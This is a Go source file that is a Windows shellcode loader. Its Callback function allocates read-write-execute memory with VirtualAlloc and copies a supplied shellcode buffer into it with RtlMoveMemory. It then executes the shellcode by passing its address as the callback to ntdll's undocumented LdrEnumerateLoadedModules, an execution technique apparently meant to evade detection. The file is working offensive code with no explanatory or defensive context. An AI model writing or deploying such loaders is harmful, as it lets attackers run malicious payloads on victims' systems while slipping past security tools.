package TT

import (
	"golang.org/x/sys/windows"
	"log"
	"syscall"
	"unsafe"
)

var (
	g_InitOnce [0]byte
	lpContext  [0]byte
	hNtdll1    uintptr
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NULL                   = 0
)

var (
	kernel32         = syscall.MustLoadDLL("kernel32.dll")
	ntdll            = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc     = kernel32.MustFindProc("VirtualAlloc")
	GetModuleHandleW = kernel32.MustFindProc("GetModuleHandleW")
	GetProcAddress   = kernel32.MustFindProc("GetProcAddress")
	LoadLibraryA     = kernel32.MustFindProc("LoadLibraryA")
	RtlMoveMemory    = ntdll.MustFindProc("RtlMoveMemory")
)

type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type PUNICODE_STRING *UNICODE_STRING

type PACTIVATION_CONTEXT unsafe.Pointer

type LDR_DATA_TABLE_ENTRY struct {
	InLoadOrderLinks            windows.LIST_ENTRY
	InMemoryOrderLinks          windows.LIST_ENTRY
	InInitializationOrderLinks  windows.LIST_ENTRY
	DllBase                     unsafe.Pointer
	EntryPoint                  unsafe.Pointer
	SizeOfImage                 uint32
	FullDllName                 UNICODE_STRING
	BaseDllName                 UNICODE_STRING
	Flags                       uint32
	LoadCount                   uint16
	TlsIndex                    uint16
	HashLinks                   windows.LIST_ENTRY
	SectionPointer              unsafe.Pointer
	CheckSum                    uint32
	TimeDateStamp               uint32
	LoadedImports               unsafe.Pointer
	EntryPointActivationContext PACTIVATION_CONTEXT
	PatchInformation            unsafe.Pointer
}

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	hNtdll, err1 := windows.LoadLibrary("ntdll")
	if err1 != nil {
		log.Fatal(err1)
	}
	LdrEnumerateLoadedModules, err := windows.GetProcAddress(hNtdll, "LdrEnumerateLoadedModules")
	if err != nil {
		log.Fatal(err)
	}
	syscall.SyscallN(LdrEnumerateLoadedModules, 3, NULL, addr, NULL)
}
